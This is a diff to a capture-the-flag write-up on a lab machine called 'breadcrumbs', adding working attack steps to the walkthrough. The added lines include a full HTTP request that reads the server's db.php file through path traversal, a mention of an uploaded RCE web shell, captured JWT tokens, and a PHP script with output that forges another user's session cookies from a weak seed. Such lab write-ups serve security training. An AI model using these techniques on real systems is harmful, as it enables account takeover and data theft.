@@ -70,7 +70,7 @@ Searching `netbios-ssn` [we find](https://www.wikiwand.com/en/NetBIOS) we find i
 
 We also see an `http` port open on `443`.  Let's add this machine to our hosts file for ease of reference:
 ```bash
-echo "10.10.10.228" breadcrumbs | sudo tee -a /etc/hosts
+echo "10.10.10.228 breadcrumbs" | sudo tee -a /etc/hosts
 ```
 
 Now we go onto
@@ -299,7 +299,7 @@ Restricted domain for: 10.10.14.239
 Please return home or contact helper if you think there is a mistake.
 ```
 
-If you click on `helper` you get to the webpage `http://breadcrumbs/portal/php/admins.php`.  This page shows a table This means they surely have some database of users we can access!
+If you click on `helper` you get to the webpage `http://breadcrumbs/portal/php/admins.php`.  This page shows a table.  This means they surely have some database of users we can access!
 
 Going back to the login portal, we can go to a signup link.  We sign up and log in, and now we have access to the following site:
 ![_config.yml]({{ site.baseurl }}/images/breadcrumbs-portal-binary.png)
@@ -449,7 +449,26 @@ If we send this to a repeater, and change the book name, we get the following er
 
 This gives us some information about the file it is using to request the books (and where on the server it is located).
 
-Recall that we have a `DB` subdirectory, with a `db.php` file in it, which we found was "empty" (probably because of rights).  Let's try this same method to request that file...  This is the response:
+Recall that we have a `DB` subdirectory, with a `db.php` file in it, which we found was "empty" (probably because of permissions).  Let's try this same method to request that file:
+```php
+POST /includes/bookController.php HTTP/1.1
+Host: breadcrumbs
+Content-Length: 26
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://breadcrumbs
+Referer: http://breadcrumbs/php/books.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=christophertatlock1e9549a0bf4b172e168a9ca5cbaa6fdb; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoiY2hyaXN0b3BoZXJ0YXRsb2NrIn19.5JlFmYKQUpQ4VEtuRp77FxrmY0BJBZReewDJR0uDqFQ
+Connection: close
+
+book=../db/db.php&method=1
+```
+
+This is the response:
 ```
 HTTP/1.1 200 OK
 Date: Wed, 17 Mar 2021 00:07:03 GMT
@@ -915,3 +934,58 @@ http://breadcrumbs/portal/vendor (Status: 301)
 2021/03/16 23:44:15 Finished
 ===============================================================
 ```
+
+So there is an `uploads` subdomain in `portal`.  I look inside and it has `shell.php` inside.  I use the above method to look at what is inside `shell.php`.  It seems to be a simple RCE script.  So there is some way of uploading this.  
+
+We have a JSON Web Token for the user `paul`:
+```
+6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e
+```
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUJ9
+
+```php
+function makesession($username){
+	$max = strlen($username) - 1;
+	$seed = rand(0, $max);
+	$key = "s41Ty_stR1nG_".$username[$seed]."(!528./9890";
+	$session_cookie = $username.md5($key);
+	
+	return $session_cookie;
+}
+```
+
+So because `paul` has only four letters, there are only four possible combinations of a seed.  I wrote a little script to get these seeds for us:
+```bash
+$ cat makesession.php
+<?php
+
+$username = "paul";
+$arrlength = 10 * strlen($username);
+$sessions = array();
+
+for ($i = 0; $i < $arrlength; $i++) {
+	$max = strlen($username) - 1;
+	$seed = rand(0, $max);
+	$key = "s41Ty_stR1nG_".$username[$seed]."(!528./9890";
+	$session_cookie = $username.md5($key);
+	$sessions[] = $session_cookie;
+}
+
+// $sessions = rsort($sessions);
+$uniquesessions = array_values(array_unique($sessions));
+$newarrlength = count($uniquesessions);
+
+for ($i = 0; $i < $newarrlength; $i++) {
+	echo $uniquesessions[$i]."\n";
+}
+
+?>
+
+$ php makesession.php
+paul3ac8745ddb8d5ca0e9cc7acd9255f32f
+pauld7901126265b858ff3d2646bf402c5ee
+paul74a686659cde9de73eed602c6fe3860e
+paul7fc31e65879e3e44827ac798a3d4f586
+```
+
